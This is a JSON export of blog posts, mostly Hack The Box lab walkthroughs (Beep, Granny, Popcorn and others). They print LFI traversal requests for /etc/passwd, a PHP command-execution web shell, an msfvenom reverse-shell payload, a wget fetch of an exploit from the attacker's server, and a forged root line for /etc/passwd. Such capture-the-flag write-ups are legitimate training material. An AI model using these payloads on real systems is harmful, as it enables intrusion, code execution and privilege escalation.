width:500px\" /></a></p>\n\n<p><em>openssl passwd -1 -salt xsisec 1234</em></p>\n\n<p><strong>xsisec:$1$xsisec$cmPKNAv2.AWbqWLKxbI4H.:0:0:root:/bin/bash</strong></p>\n\n<p>&nbsp;</p>\n\n<p>then I run su xsisec:1234</p>\n\n<p>voila I am root.</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190527-133430.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190527-133430.png\" style=\"height:281px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>It was a very good box I learned a lots of things from this box eg:</p>\n\n<p>&nbsp;</p>\n\n<ul>\n\t<li>how to be effecient with grep</li>\n\t<li>how to make a wordlist from a list</li>\n\t<li>bruteforce with hydra any http-method</li>\n\t<li>how to add user manually into passwd</li>\n</ul>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p><br />\n&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n",
      "ipadress": "10.10.10.46",
      "title": "Apocalyst  - Completed [Hack the box] - [Blog]",
      "published": {
        "seconds": 1558964680,
        "nanoseconds": 528000000
      }
    },
    "nfuBQ4FiyRQAGf52RnkQ": {
      "levels": [
        "Beginner"
      ],
      "image": null,
      "os": [
        "Linux"
      ],
      "content": "<p>I completed yesterday the the Beep box though I found a lots of necessary stuff I should make as default when bruteforcing.</p>\n\n<p>&nbsp;</p>\n\n<p>for the enumeration of nested directories:</p>\n\n<p>&nbsp;</p>\n\n<h1>[Burp Suite&nbsp; Repeater]</h1>\n\n<p>this was the weak url:</p>\n\n<p>&nbsp;</p>\n\n<p>Request 1<br />\nhttps://beep.htb/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action</p>\n\n<p><a href=\"http://xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_016.png\" target=\"_blank\"><img alt=\"\" src=\"http://xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_016.png\" style=\"height:281px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>Request2:<br />\nGET /vtigercrm/graph.php?current_language=../../../../../../../../proc/self/status%00&amp;module=Accounts&amp;action HTTP/1.1<br />\n&nbsp;</p>\n\n<p><a href=\"http://xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_018.png\" target=\"_blank\"><img alt=\"\" src=\"http://xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_018.png\" style=\"height:281px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>This request shows which processes are running by user &#39;UID/GID&#39;.</p>\n\n<p>Uid:&nbsp;&nbsp; &nbsp;100&nbsp;&nbsp; &nbsp;100&nbsp;&nbsp; &nbsp;100&nbsp;&nbsp; &nbsp;100<br />\nGid:&nbsp;&nbsp; &nbsp;101&nbsp;&nbsp; &nbsp;101&nbsp;&nbsp; &nbsp;101&nbsp;&nbsp; &nbsp;101</p>\n\n<p>Request 3:</p>\n\n<p>GET /vtigercrm/graph.php?current_language=../../../../../../../../etc/passwd%00&amp;module=Accounts&amp;action HTTP/1.1</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"https://xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_016.png\" target=\"_blank\"><img alt=\"\" src=\"https://xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_016.png\" style=\"height:281px; width:500px\" /></a></p>\n\n<p>now lets filter the UID/GID for the above request based on&#39;100:101&#39;</p>\n\n<p>we found:</p>\n\n<p>asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash</p>\n\n<p>&nbsp;</p>\n\n<p>[Burp Suite&nbsp; Intruder]</p>\n\n<p>send the following request to intruder</p>\n\n<p>GET /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action HTTP/1.1<br />\nHost: beep.htb<br />\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0<br />\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />\nAccept-Language: en-US,en;q=0.5<br />\nAccept-Encoding: gzip, deflate<br />\nConnection: close<br />\nUpgrade-Insecure-Requests: 1<br />\nCache-Control: max-age=0</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_019.png\" target=\"_blank\"><img alt=\"\" src=\"http://xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_019.png\" style=\"height:281px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>now clear all the default &#39;&sect;&#39;&nbsp; and add them in following place:</p>\n\n<p>GET /vtigercrm/graph.php?current_language=../../../../../../../../&sect;attack_here&sect;%00&amp;module=Accounts&amp;action HTTP/1.1</p>\n\n<p><br />\nNow navigate to Burpsuite&gt;Intruder&gt;REQ1&gt;Payloads and download following Git-repo:</p>\n\n<p>https://github.com/tennc/fuzzdb/tree/master/dict&gt;PayLoad&gt;LFI&gt;</p>\n\n<p>Load following lists:<br />\nLFI-FD-check.txt&nbsp;<br />\nLFI-InterestingFiles.txt<br />\nLFI-LogFileCheck.txt</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_020.png\" target=\"_blank\"><img alt=\"\" src=\"http://xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_020.png\" style=\"height:281px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>Click on Start attack</p>\n\n<p>now sort the content based on length</p>\n\n<p><a href=\"http://xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_021.png\" target=\"_blank\"><img alt=\"\" src=\"http://xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_021.png\" style=\"height:281px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n",
      "ipadress": "0.0.0.0",
      "title": "BURP-Suite procedure for enumeration nested directories",
      "published": {
        "seconds": 1555762460,
        "nanoseconds": 392000000
      },
      
      "author": "XsiSec"
    },
    "nsZOp59MwjUNlOp0Ye7X": {
      "author": "XsiSec",
      
      "image": "https://firebasestorage.googleapis.com/v0/b/xsisec-com.appspot.com/o/posts%2Fautomation_005.png?alt=media&token=ad791593-62e3-450e-b803-c8603cb06935",
      "content": "<div>since I will very soon might start in project where the front-end is built in angular I thought I will do some experimental things within Protractor also it's good to know</div><div><br>For the coding part I was using in first place Visual studio code&nbsp; though after a while when I made some code also setup a working debugger I felt <br>its really a waste of time since for each function I wrote I needed to create <br></div><div>try-catch statements.</div><div>so I decided to move on and I have experience for a time ago in Webstorm.</div><div><br>As I was expecting it worked like a charm also Webstorm take care of the errors very well such as 'cant find elements or other stuff'.<br></div><div><br></div>I have used following stuff:<div><br></div><div><ul><li>Webstorm <br></li><li>Protractor</li><li>protractor-beautiful-reporter<br><br></li></ul></div>",
      "title": "Spent some time to learn Protractor and some cool plugins",
      "published": {
        "seconds": 1554892089,
        "nanoseconds": 771000000
      }
    },
    "rpTWYoLjHebppIjOQylJ": {
      "content": "<p>There was a time ago I did some boxes but I will try to do new boxes at least 3 boxex per common weeks.</p>\n\n<p>&nbsp;</p>\n\n<p>I started up with nmap as usually</p>\n\n<p>&nbsp;</p>\n\n<p>nmap -sC -sV -oA october 10.10.10.16</p>\n\n<p>it was a CMS called Vanilia though I was looking in first place for the version also did some searchsploit research though,</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>There was some locations found by gobuster like:</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://xsisec.com/screenshots/Selection20190912-224226.png\" target=\"_blank\"><img alt=\"\" src=\"http://xsisec.com/screenshots/Selection20190912-224226.png\" style=\"height:186px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>Backend I found out it did redirect you to the loginpage</p>\n\n<p>&nbsp;</p>\n\n<p>I tried the easy credentials admin:admin</p>\n\n<p><br />\nThen I logged on as admin also uploaded a php shell (pentest monkey)</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190912-224402.png\" target=\"_blank\"><img alt=\"\" src=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190912-224402.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>then I just was listening to the browser and voila I am in =)</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190912-224002.png\" target=\"_blank\"><img alt=\"\" src=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190912-224002.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n",
      "ipadress": "10.10.10.16",
      "title": "October  - Part 1 [Hack the box] - [Blog]",
      "published": {
        "seconds": 1568321215,
        "nanoseconds": 114000000
      },
      "author": "XsiSec none",
      
      "levels": [
        "Medium"
      ],
      "image": null,
      "os": [
        "Linux"
      ]
    },
    "uHrVjZJDl9o7iOP9p8cE": {
      "updatedOn": "",
      "title": "test",
      "body": "test",
      "createdOn": "",
      "uid": "uHrVjZJDl9o7iOP9p8cE",
      "isPublished": ""
    },
    "vcGK5QdgZqFEaJT5ZmZT": {
      "levels": [
        "Hard"
      ],
      "image": null,
      "os": [
        "Windows"
      ],
      "content": "<p>This was a very fun box I felt at this stage I could re-use a lots of knowledge from earlier solved boxes:</p>\n\n<p>&nbsp;</p>\n\n<p>I started of with a simple nmap</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_012.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_012.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>as usual but to speed it up I run nikto as well:</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_011.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_011.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>since&nbsp;I have used a tool called <strong>postman</strong>,&nbsp;before I am pretty comfortable with different types of request by send to the webserver the flag<strong> &#39;OPTIONS&#39;</strong>, I am able to see which parameters the server accept:</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_013.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_013.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>then i started to google around on handy tools to upload content.</p>\n\n<p>I started off with a tool called&nbsp;<strong>QuickPut</strong>,</p>\n\n<p><em>python QuickPut.py /home/xsisec/php-reverse-shell.php http://granny.htb/_vti_log/shell.php</em></p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_014.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_014.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p><br />\nI was stuck for a while I couldnt execute the php content on the webserver so I was looking at the write-up file for a while and several hours then i checked little bit of <em>@ippsec,</em></p>\n\n<p>&nbsp;</p>\n\n<p>Meanwhile a good tool I installed called tmux (basically you can close terminal sessions etc but keep things going on in background) very satisfiying.&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_001%2019-05-02_1922_1064.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_001%2019-05-02_1922_1064.png\" style=\"height:277px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>lets continue...</p>\n\n<p>&nbsp;</p>\n\n<p>so after I while meanwhile watching @ippsec&nbsp; he fetched som information I missed from my research the server take cares of &quot;*.aspx&quot; files so first I found on google a shell I tried to upload but then I was not able I got forbidden error message.</p>\n\n<p>then I watched again on @ippsec I pretty early had in my mind based on the info...</p>\n\n<p>What if I am not directly able to upload a raw &quot;*.aspx&quot;, file (that contains aspx code) .... what happens instead upload the file as &quot;test.html&quot; then move it to same path but rename it as &quot;test.aspx&quot;.</p>\n\n<p>that was the solution=)</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Screenshot_20190502-175856.png.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Screenshot_20190502-175856.png.png\" style=\"height:277px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>then before I visit the URL I started a TCP handler to listen to the incoming request:</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Screenshot_20190502-180124.png.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Screenshot_20190502-180124.png.png\" style=\"height:277px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>then I run the command &quot;shell&quot;</p>\n\n<p>then whoami&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Screenshot_20190502-180241.png.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Screenshot_20190502-180241.png.png\" style=\"height:277px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>then was it time to find out the vulnerabilities of the box by run meterpreter in background then listen to the session</p>\n\n<p><em>background</em></p>\n\n<p><em>[*] Backgrounding session 1...</em></p>\n\n<p>&nbsp;</p>\n\n<p>then I run following exploit <em>&#39;post/multi/recon/local_exploit_suggester&#39;</em></p>\n\n<p><em>set LHOST 10.10.14.60</em></p>\n\n<p><em>set PORT 4444</em></p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Screenshot_20190502-180649.png.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Screenshot_20190502-180649.png.png\" style=\"height:277px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>I tried several of them before I got stuck again I was stuck for a while so I was watching @ippsec more.</p>\n\n<p>I finally ended up with following exploit:</p>\n\n<p><em>&#39;use exploit/windows/local/ms14_070_tcpip_ioctl&#39;</em></p>\n\n<p><em><a href=\"http://www.xsisec.com/screenshots/Screenshot_20190502-181156.png.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Screenshot_20190502-181156.png.png\" style=\"height:277px; width:500px\" /></a></em></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>finally the flag user flag.</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Screenshot_20190502-181232.png.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Screenshot_20190502-181232.png.png\" style=\"height:277px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>I could still keep using the same exploit for the root flag</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Screenshot_20190502-181335.png.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Screenshot_20190502-181335.png.png\" style=\"height:277px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>I forgot to mention a tool he used that enumerates the url and try different post methods called davtest though I coudlnt make it work.</p>\n\n<p>davtest -url http://granny.htb</p>\n\n<p>&nbsp;</p>\n\n<p>I will defenitly make use of next time</p>\n\n<ul>\n\t<li>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.40 LPORT=1337 -f aspx</li>\n\t<li>multi/handler/</li>\n\t<li>post/multi/recon/local_exploit_suggester</li>\n</ul>\n\n<p>&nbsp;</p>\n\n<p>then I learned few commands to display listening ports:</p>\n\n<ul>\n\t<li>see listened ports:</li>\n\t<li>sudo lsof -i -P -n</li>\n\t<li>netstat -npl</li>\n\t<li>lsof -Pnl +M -i6<br />\n\t<br />\n\tThank you!</li>\n</ul>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n",
      "ipadress": "10.10.10.15",
      "title": "Granny - Completed [Hack the box] ",
      "published": {
        "seconds": 1556813806,
        "nanoseconds": 329000000
      },
      
      "author": "XsiSec"
    },
    "wW4E7o07n6D1nBirfWB1": {
      "content": "<p><a href=\"http://xsisec.com/screenshots/BlackYellowDesktop.png\" target=\"_blank\"><img alt=\"\" src=\"http://xsisec.com/screenshots/BlackYellowDesktop.png\" style=\"height:281px; width:500px\" /></a></p>\n\n<p><br />\nI have had a lots of work that why I have not done some updates on my site.<br />\nHere is&nbsp; a new Debian setup I made.</p>\n\n<p>I hope I get some time upcoming month to complete more Hack the box challanges.</p>\n",
      "ipadress": "0.0.0.0",
      "title": "Long time no update ",
      "published": {
        "seconds": 1566240820,
        "nanoseconds": 466000000
      },
      
      "author": "XsiSec none",
      "levels": [
        "Beginner",
        "None"
      ],
      "image": null,
      "os": [
        "Linux"
      ]
    },
    "zh4VXPvf0QiWnaFaXhVK": {
      "content": "<div style=\"\"><div style=\"\"><i>From day 1 I changed track totally I looked around for some walkthrough,</i></div><div style=\"\"><i>though I felt several difference solutions generate the same outcome.</i></div><div style=\"\"><br></div><div style=\"\">this is&nbsp; the steps:</div><div style=\"\">1. Scanning</div><div style=\"\">2. create a fakeuser</div><div style=\"\">3. File enumeration</div><div style=\"\">4. Discover of Web App</div><div style=\"\">5. Uploading a PHP Shell</div><div style=\"\">6. Python pty reverse shell</div><div style=\"\"><br></div><div style=\"\"><br></div><div style=\"\">xsisec@d0m:~/Desktop# nmap -sS -sV -O 10.10.10.6&nbsp;</div><div style=\"\">Starting Nmap 7.50 ( https://nmap.org ) at 2017-12-19 09:18 EST&nbsp;</div><div style=\"\">Nmap scan report for 10.10.10.6&nbsp;</div><div style=\"\">Host is up (0.15s latency).&nbsp;</div><div style=\"\">Not shown: 998 closed ports&nbsp;</div><div style=\"\">PORT STATE SERVICE VERSION&nbsp;</div><div style=\"\">22/tcp open ssh OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)&nbsp;</div><div style=\"\">80/tcp open http Apache httpd 2.2.12 ((Ubuntu))&nbsp;</div><div style=\"\">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).&nbsp;</div><div style=\"\">Network Distance: 2 hops&nbsp;</div><div style=\"\">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&nbsp;</div><div style=\"\">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&nbsp;</div><div style=\"\">Nmap done: 1 IP address (1 host up) scanned in 88.76 seconds&nbsp;</div><div style=\"\">xsisec@d0m:~/Desktop#</div><div style=\"\"><br></div><div style=\"\"><br></div><div style=\"\">xsisec@d0m:~/Desktop# gobuster -e -u http://10.10.10.6/ -t 500 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</div><div style=\"\"><br></div><div style=\"\">Gobuster v1.2 OJ Reeves (@TheColonial)&nbsp;</div><div style=\"\">=====================================================&nbsp;</div><div style=\"\">[+] Mode : dir&nbsp;</div><div style=\"\">[+] Url/Domain : http://10.10.10.6/&nbsp;</div><div style=\"\">[+] Threads : 500&nbsp;</div><div style=\"\">[+] Wordlist : /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt&nbsp;</div><div style=\"\">[+] Status codes : 301,302,307,200,204&nbsp;</div><div style=\"\">[+] Expanded : true&nbsp;</div><div style=\"\">=====================================================&nbsp;</div><div style=\"\">http://10.10.10.6/index (Status: 200)&nbsp;</div><div style=\"\">http://10.10.10.6/test (Status: 200)&nbsp;</div><div style=\"\">http://10.10.10.6/torrent (Status: 301)&nbsp;</div><div style=\"\">http://10.10.10.6/rename (Status: 301)&nbsp;</div><div style=\"\">=====================================================&nbsp;</div><div style=\"\">xsisec@d0m:~/Desktop#</div><div style=\"\"><br></div><div style=\"\"><i>after uploading a torrent file add a screenshoot to uploaded torrent.</i></div><div style=\"\"><i>listen to the proxy and use burp-suite&nbsp;</i></div><div style=\"\"><i>upload the shell as shell.php.png</i></div><div style=\"\"><br></div><div style=\"\">&lt;?php echo (system($_GET['xsisec'])); ?&gt;</div><div style=\"\">modify the request to 'shell.php'</div><div style=\"\">content-type:image/png</div><div style=\"\"><i><br></i></div><div style=\"\"><i>now time to find out where the server store uploaded data</i></div><div style=\"\"><i>I figured out 10.10.6/torrent/upload/shell.php</i></div><div style=\"\"><i>now you could run php command such 'whoami'</i></div><div style=\"\">wwww-data</div><div style=\"\">the first flag was placed in /home/george/user.txt</div><div style=\"\"><br></div><div style=\"\"><i>Become Root was&nbsp; the more tricky part I tried several things but..</i></div><div style=\"\"><i>I download another php shell from pentest monkey 'php-reverse-shell'(added the local-ip + a port).</i></div><div style=\"\"><i>it was the same procedure as before modify the request with burp-suite.</i></div><div style=\"\"><i>Before navigate to the URL we need to listen to our phpshell by:</i></div><div style=\"\"><br></div><div style=\"\"><br></div><div style=\"\">xsisec@d0m:~/Desktop# nc -nlvp 1337&nbsp;</div><div style=\"\">listening on [any] 1337 ...&nbsp;</div><div style=\"\">connect to [10.10.14.14] from (UNKNOWN) [10.10.10.6] 52549&nbsp;</div><div style=\"\">Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux&nbsp;</div><div style=\"\">19:50:19 up 1 day, 18:50, 0 users, load average: 0.00, 0.00, 0.00&nbsp;</div><div style=\"\">USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT&nbsp;</div><div style=\"\">uid=33(www-data) gid=33(www-data) groups=33(www-data)&nbsp;</div><div style=\"\">/bin/sh: can't access tty; job control turned off&nbsp;</div><div style=\"\">$ id&nbsp;</div><div style=\"\">uid=33(www-data) gid=33(www-data) groups=33(www-data)&nbsp;</div><div style=\"\">$uname -a&nbsp;</div><div style=\"\">Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux&nbsp;</div><div style=\"\">$</div><div style=\"\"><i>now its time to upload another shell for local Privilege Escalation:&nbsp;</i></div><div style=\"\"><i>https://www.exploit-db.com/exploits/15704</i></div><div style=\"\"><i>Set-up a local http-server on your hackermachine I used:</i></div><div style=\"\"><i>https://github.com/infodox/python-pty-shells&nbsp;</i></div><div style=\"\"><br></div><div style=\"\">xsisec@d0m:~/Documents/python-pty-shells$ python -m SimpleHTTPServer&nbsp; Serving HTTP on 0.0.0.0 port 8000 ...</div><div style=\"\">(place the exploit.c within root di of server)</div><div style=\"\">From the remote shell navigate to /www-data/tmp</div><div style=\"\"><br></div><div style=\"\">$ /bin/bash -i</div><div style=\"\">bash: no job control in this shell</div><div style=\"\">www-data@popcorn:/$ cd tmp<span style=\"white-space:pre\">\t</span></div><div style=\"\">cd tmp</div><div style=\"\">www-data@popcorn:/tmp$ wget http://10.10.*.*:8000/exploit.c</div><div style=\"\">wget http://10.10.*.*:8000/exploit.c</div><div style=\"\">www-data@popcorn:/tmp$ gcc exploit.c -o exploit</div><div style=\"\">gcc exploit.c -o exploit</div><div style=\"\">www-data@popcorn:/tmp$ ./exploit</div><div style=\"\">./exploit</div><div style=\"\">id</div><div style=\"\">uid=0(root) gid=0(root)</div><div style=\"\">bin/bash -i</div><div style=\"\">/bin/sh: bin/bash: not found</div><div style=\"\">/bin/bash -i</div><div style=\"\">bash: no job control in this shell</div><div style=\"\">root@popcorn:/tmp# cd /home<span style=\"white-space:pre\">\t</span></div><div style=\"\">cd /home</div><div style=\"\">root@popcorn:/home# cd /root</div><div style=\"\">cd /root</div><div style=\"\">root@popcorn:/root# cat root.txt</div><div style=\"\">cat root.txt</div><div style=\"\">f122331023a9393319a0370129fd9b14</div><div style=\"\">root@popcorn:/root#&nbsp;</div></div><div style=\"background-color: transparent;\"><br></div>",
      "title": "Made some progress in the \"Popcorn day Complete  [Hack the box] ",
      "published": {
        "seconds": 1554379917,
        "nanoseconds": 714000000
      },
      "author": "XsiSec",
      
      "image": "https://firebasestorage.googleapis.com/v0/b/xsisec-com.appspot.com/o/posts%2FKali%20Linux%20HTB%20-%20VMware%20Workstation_009.png?alt=media&token=362b0fc4-f421-4165-a670-a0664e1e2303"
    }
  }
}
